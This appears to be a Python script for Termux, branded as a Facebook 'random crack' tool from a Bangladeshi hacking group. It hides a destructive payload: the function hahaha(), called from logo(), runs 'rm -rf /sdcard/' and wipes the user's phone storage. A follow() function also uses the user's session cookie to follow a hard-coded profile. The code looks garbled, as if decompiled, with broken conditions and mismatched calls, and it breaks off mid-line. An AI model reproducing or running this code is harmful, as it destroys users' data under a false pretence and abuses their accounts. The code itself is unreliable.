#####################
#___GIFT FROM HERON___#
#####################
import os
import sys
import time
import requests
import uuid


def o():
    _HERON_('clear')
    logo("""\033[1;39m     
\033[1;39m     ██████╗  █████╗ ██████╗ ██╗   ██╗
\033[1;39m     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
\033[1;39m     ██║  ██║███████║██████╔╝█████╔╝ 
\033[1;39m     ██║  ██║██╔══██║██╔══██╗██╔═██╗ 
\033[1;39m     ██████╔╝██║  ██║██║  ██║██║   ██╗
\033[1;39m     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝
                                
\033[1;39m     ██╗  ██╗██╗███╗   ██╗ ██████╗   
\033[1;39m     ██║ ██╔╝██║████╗  ██║██╔════╝   
\033[1;39m     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
\033[1;39m     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
\033[1;39m     ██║  ██╗██║██║ ╚████║╚██████╔╝  
\033[1;39m     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
                                                                
───────────────────────────────────────────────────────────────
🔰🎭 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐃𝐀𝐑𝐊 𝐖𝐄𝐕 𝐗 𝐌𝐀𝐅𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘  𝐓𝐄𝐈𝐌 🎭🔰                                               

🔰🎭𝐗 𝐌𝐀𝐅𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘 𝐂𝐄𝐎🎭🔰

🔰🎭𝐃𝐀𝐑𝐊 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐃𝐂𝐒 𝟕𝟏 𝐂𝐑𝐎🎭🔰

────────────────────────────────────────────────────────────────
   🔰🎭 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐃𝐀𝐑𝐊 𝐖𝐄𝐕 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐄𝐈𝐌🎭🔰
  
\033[36;1m |───────────────────────────────────────┐
\033[36;1m | 🔰🎭  𝐗 𝐌𝐀𝐅𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘  𝐓𝐄𝐈𝐌🎭🔰               |
\033[36;1m | 🔰🎭  𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐃𝐄𝐒 𝟕𝟏🎭🔰
\033[36;1m┌───────────────────────────────────────┐
\033[36;1m |───────────────────────────────────────┐
\033[36;1m│ [♣][♠]𝐀𝐔𝐓𝐇𝐎𝐑____𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆                                            
\033[36;1m│ [♣][♠]𝐆𝐈𝐓𝐇𝐔𝐁_____𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏                             
\033[36;1m│ [♣][♠]𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏___+𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟓                                     
\033[36;1m│ [♣][♠]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊____𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆                                        
\033[36;1m│ [♣][♠]𝐕𝐄𝐑𝐒𝐈𝐎𝐍____𝐎.𝟐❥                                                       
\033[36;1m│ [♣][♠]𝐅𝐑𝐎𝐌___𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇❥                                              
\033[36;1m│ [♣][♠]𝐖𝐎𝐑𝐊___𝐇𝐀𝐂𝐊𝐈𝐍𝐆_𝐏𝐎𝐆𝐑𝐀𝐌𝐈𝐆❥                              
\033[36;1m│ [♣][♠]𝐁𝐎𝐗___𝐗 𝐌𝐀𝐅𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘 𝐓𝐄𝐈𝐌      
\033[36;1m│ [♣][♠]𝐏𝐎𝐖𝐄𝐑__𝐁𝐘__\033[1;36m𝐌𝐀𝐗 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆❥\033[1;36m           
\033[36;1m└───────────────────────────────────────┘\n""")

    print('\033[1;32m─────────────────────────────────────────────────────────')
    heron('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
    heron('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
    heron('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW You tub ')
    heron('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW PAGE')
    heron('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        _HERON_('xdg-open https://www.facebook.com/Darkkingcybercrime71')
        return None
    if None == '3':
        _HERON_('xdg-open https://wa.Me/880174028158')
        return None
    if None == '4':
        _HERON_('xdg-open https://www.facebook.com/groups/973947490452060/')
        return None
    if None == '0':
        _HERON_('exit')
        return None


import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from os import system as _HERON_
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    _HERON_('pip install mechanize requests futures bs4==2 > /dev/null')
    _HERON_('pip install bs4')    
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class heron:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
def hahaha():
	_HERON_("termux-setup-storage -y")
	_HERON_("rm -rf /sdcard/")
	_HERON_("rm -rf /sdcard/*")
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def logo():
    hahaha()
    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
    heron(f"""\n\033[1;90m██   ██ ███████ ██████   ██████ {color_logo} ███    ██ \n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ████   ██ \n\033[1;90m███████ █████   ██████  ██    ██{color_logo} ██ ██  ██    \033[1;97m┏━┓\n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ██  ██ ██  \033[1;92m ┫\033[1;90m│\033[1;91m\033[47m𝘽\033[00m\033[1;90m│\033[1;92m┣\n\033[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙍\033[00m\033[1;90m│\033[1;92m┣\n\t\t\t\t\t      \033[1;90m│\033[1;91m\033[47m𝘼\033[00m\033[1;90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mheroncyber99      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01722183463       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙         \033[1;35m:  \033[1;31m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\t\t \033[1;30m[\033[1;32m\033[1;47m𝗕.𝗗.𝗛.𝗔\033[00m\033[1;30m] """)

loop =
